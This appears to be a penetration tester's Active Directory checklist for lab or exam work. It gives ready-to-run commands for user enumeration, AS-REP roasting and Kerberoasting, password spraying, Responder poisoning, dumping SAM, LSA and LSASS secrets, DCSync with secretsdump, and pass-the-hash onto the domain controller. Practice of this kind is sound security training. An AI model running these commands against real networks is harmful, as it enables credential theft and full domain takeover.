# AD checklist

## Before I start
At the pwn-broker prompt: tool install netexec and tool install impacket.
- [ ] All TCP ports on every host, then the top UDP ports: :Pb ports
- [ ] The domain name and the DC's host name, from the scan or from nxc
nxc smb <DCIP>
- [ ] The domain and the DC added to /etc/hosts: host add, at the pwn-broker prompt
- [ ] My clock set to the DC's, or Kerberos fails with KRB_AP_ERR_SKEW
sudo timedatectl set-ntp off
sudo ntpdate <DCIP>
- [ ] The credential steps below repeated for every new account I get

## No credentials yet
- [ ] Null and guest sessions on SMB and RPC, and every readable share: :Pb smb
- [ ] Anonymous LDAP: :Pb ldap
- [ ] A user list from RID cycling, LDAP and kerbrute: :Pb domain-enum
kerbrute userenum -d <Domain> --dc <DCIP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o kerbrute.txt
grep 'VALID USERNAME' kerbrute.txt | awk '{print $NF}' | cut -d '@' -f1 >> users.txt
- [ ] AS-REP roasting with that list: :Pb asrep
impacket-GetNPUsers '<Domain>/' -usersfile users.txt -no-pass -dc-ip <DCIP> -format hashcat -outputfile asrep.txt
- [ ] The lockout policy read, then each username tried as its own password: :Pb spraying
nxc smb <DCIP> -u users.txt -p users.txt --no-bruteforce --continue-on-success
- [ ] LLMNR and NBT-NS poisoning on a network with users on it: :Pb responder
- [ ] Every member host's other services, web above all: :Pb standalone

## With a domain credential
nxc smb <DCIP> -d <Domain> -u '<Username>' -p '<Password>'
- [ ] Tried on every host and protocol: SMB, WinRM, RDP, MSSQL and LDAP, in :Pb smb
- [ ] Users, groups, the password policy and every description: :Pb domain-enum and :Pb ldap
- [ ] Kerberoasting: :Pb kerberoasting
- [ ] A cracked service account forged into a silver ticket to its service, with no DC: :Pb golden-silver
- [ ] Every share again as this user, SYSVOL included, for GPP passwords
nxc smb <DCIP> -d <Domain> -u '<Username>' -p '<Password>' -M gpp_password
- [ ] BloodHound collected, and read from every principal I own
nxc ldap <DCIP> -d <Domain> -u '<Username>' -p '<Password>' --bloodhound --collection All --dns-server <DCIP>
- [ ] Outbound object control from each owned user and its groups: :Pb acl-abuse
- [ ] LAPS, gMSA and the machine account quota
nxc ldap <DCIP> -d <Domain> -u '<Username>' -p '<Password>' -M laps
nxc ldap <DCIP> -d <Domain> -u '<Username>' -p '<Password>' --gmsa
nxc ldap <DCIP> -d <Domain> -u '<Username>' -p '<Password>' -M maq
- [ ] Unconstrained, constrained and resource-based delegation: :Pb delegation
impacket-findDelegation '<Domain>/<Username>:<Password>' -dc-ip <DCIP>
- [ ] Certificate services and their templates: :Pb adcs
certipy find -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -vulnerable -stdout
- [ ] A GPO I can edit, from BloodHound: :Pb gpo-abuse
- [ ] A share people browse that I can write: a lure file there, and Responder for the hash: :Pb responder

## On every host I own
- [ ] Local privilege escalation if I need it: :Pb windows-enum
- [ ] Every hash on the host: SAM, LSA secrets and LSASS
nxc smb <TargetIP> -d <Domain> -u '<Username>' -p '<Password>' --sam
nxc smb <TargetIP> -d <Domain> -u '<Username>' -p '<Password>' --lsa
nxc smb <TargetIP> -d <Domain> -u '<Username>' -p '<Password>' -M lsassy
- [ ] Credentials in files, history and configs: snaffler's Snaffler.exe and peass-ng's winPEASx64.exe, from serve
- [ ] New hashes cracked, and every password and hash tried everywhere: :Pb hash-cracking
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
- [ ] The next host reached with what I have: :Pb smb, where this credential works, and :Pb remote-access
- [ ] BloodHound collected again as the new account, and the node marked owned
- [ ] Another network interface: a pivot, :Pb ligolo, then :Pb ports through it

## Domain admin
impacket-secretsdump -just-dc-ntlm '<Domain>/<Username>:<Password>@<DCIP>'
- [ ] The Administrator hash into evil-winrm on the DC for the proof
- [ ] Other domains in a trust: the same checklist again from the top

## Stuck
- [ ] Every credential on every protocol and host, with --local-auth as well
- [ ] Every share read again with every account
- [ ] BloodHound outbound object control for each owned user, and shortest paths from owned
- [ ] UDP ports, and slower rescans of every host
- [ ] Kerberos errors: the clock in sync, /etc/hosts right, and host names rather than IPs
